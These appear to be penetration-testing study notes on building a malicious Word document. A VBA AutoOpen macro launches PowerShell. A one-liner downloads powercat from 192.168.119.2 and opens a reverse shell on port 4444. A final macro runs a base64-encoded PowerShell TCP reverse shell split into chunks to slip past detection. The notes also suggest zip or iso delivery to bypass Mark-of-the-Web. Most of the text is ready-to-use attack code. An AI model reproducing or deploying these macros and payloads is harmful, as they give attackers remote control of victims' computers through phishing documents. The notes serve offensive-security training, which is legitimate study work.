* If the file is downloaded via email the file is delivered as `MOTW` *Mark on the web* 
* The enable editing button then needs to be clicked on 
* This can be bypassed by delivering in a zip iso etc
## Leveraging Macros
1. Create a blank document
```
mymacro.doc
```
*View > Macros > Create*
```VBA 
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

*Sub AutoOpen():* This is a special macro that automatically executes whenever the Word document containing this code is opened.
`MyMacro` calls the macro 

*Sub Document_Open()*: This is another special macro that automatically executes specifically when the document is opened (a similar but distinct event from just loading the Word application).
*MyMacro*: Again, this calls the MyMacro subroutine, launching PowerShell.

*Sub MyMacro()*: This subroutine defines the core action of the code.

*CreateObject("Wscript.Shell").Run "powershell":* This line remains unchanged. It creates a Wscript.Shell object and uses the Run method to launch PowerShell.


```Powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```
Split this into chunks of 50 chars

```bash
Str="powershell -e JABjAGwAaQBl........"

# Split the encoded string into chunks of 50 characters
chunk_size=50
for ((i=0; i<${#str}; i+=chunk_size)); do
  chunk="${str:$i:$chunk_size}"
  echo "Str = Str +  $chunk"  
done

```

```VBA
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
	Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
	Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
	Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
	Str = Str + "MQA5ADIALgAxADYAOAAuADQANQAuADIAMgA1ACIALAAxADIAMw"
	Str = Str + "A0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBu"
	Str = Str + "AHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AG"
	Str = Str + "UAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUA"
	Str = Str + "MwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQ"
	Str = Str + "AgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABl"
	Str = Str + "AHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AG"
	Str = Str + "gAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0A"
	Str = Str + "IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATg"
	Str = Str + "BhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBD"
	Str = Str + "AEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAG"
	Str = Str + "kAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQA"
	Str = Str + "cwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQ"
	Str = Str + "B0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBu"
	Str = Str + "AGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAH"
	Str = Str + "MAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAA"
	Str = Str + "KABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJA"
	Str = Str + "BzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBl"
	Str = Str + "AG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAG"
	Str = Str + "UAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkA"
	Str = Str + "OwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbg"
	Str = Str + "BkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBM"
	Str = Str + "AGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AH"
	Str = Str + "MAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
	Str = Str + "KAApAA=="



    CreateObject("Wscript.Shell").Run Str
End Sub
```
